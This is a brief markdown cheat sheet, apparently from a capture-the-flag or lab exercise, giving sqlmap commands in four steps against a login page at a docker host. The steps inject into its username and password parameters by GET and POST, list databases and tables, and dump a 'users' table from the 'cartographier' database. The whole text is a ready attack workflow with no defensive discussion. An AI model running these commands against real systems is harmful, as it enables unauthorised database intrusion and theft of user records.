# sqlmap example

1. Analyze the target:

```
GET: sqlmap -u "http://docker.strangesite.eu:33412/index.php?username=admin&password=password"
POST: sqlmap -u "http://docker.strangesite.eu:33412/index.php" --data="username=admin&password=password"
```

2. Get the datbase names:

```
GET: sqlmap -u "http://docker.strangesite.eu:33412/index.php?username=admin&password=password" --dbs
POST: sqlmap -u "http://docker.strangesite.eu:33412/index.php" --data="username=admin&password=password" --dbs
```

3. Get the table names:

```
GET: sqlmap -u "http://docker.strangesite.eu:33412/index.php?username=admin&password=password" -D cartographier --tables
POST: sqlmap -u "http://docker.strangesite.eu:33412/index.php" --data="username=admin&password=password" -D cartographier --tables
```

4. Get the table data:

```
GET: sqlmap -u "http://docker.strangesite.eu:33412/index.php?username=admin&password=password" -D cartographier -T users --dump
POST: sqlmap -u "http://docker.strangesite.eu:33412/index.php" --data="username=admin&password=password" -D cartographier -T users --dump
```
